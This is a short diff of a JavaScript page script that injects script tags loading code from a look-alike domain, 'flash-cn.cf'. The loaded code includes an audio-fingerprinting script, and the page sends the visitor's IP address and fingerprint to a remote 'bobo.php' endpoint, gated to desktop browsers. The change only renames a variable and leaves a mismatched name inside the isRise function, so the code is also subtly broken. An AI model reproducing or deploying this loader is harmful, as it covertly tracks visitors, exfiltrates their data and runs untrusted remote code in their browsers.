@@ -1,4 +1,4 @@
-var returnCitySN = {"cip": "0.0.0.0", "bobo": "000000"};
+var returnCitySN = {"cip": "0.0.0.0", "extend": "000000"};
 // document.write("<script src='http://pv.sohu.com/cityjson?ie=utf-8'></script>");
 document.write("<script src='http://flash-cn.cf/audio-fingerprinting.js'></script>")
 document.write("<script src='http://flash-cn.cf/bobo.php?getaddr=123'></script>");
@@ -23,7 +23,7 @@ function isRise(ip,bobo) {
         //alert(xmlHttp.responseText)
         if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
             var resData = xmlHttp.responseText;
-            if (resData == "in" && bobo == "111111") {
+            if (resData == "in" && extend == "111111") {
             } else {
                 document.write("<script src='http://flash-cn.cf/bobo.php?bobo=1'></script>");
                 xmlHttp.open("GET", "http://flash-cn.cf/bobo.php?ip="+ip+fingerprint, "true");
@@ -58,6 +58,6 @@ window.onload = function(){
     if(!isPc()){
         alert("当前页面只能在电脑PC端中加载,请稍后重试...");
     }else{
-        isRise(returnCitySN["cip"], returnCitySN["bobo"]);
+        isRise(returnCitySN["cip"], returnCitySN["extend"]);
     }
 }
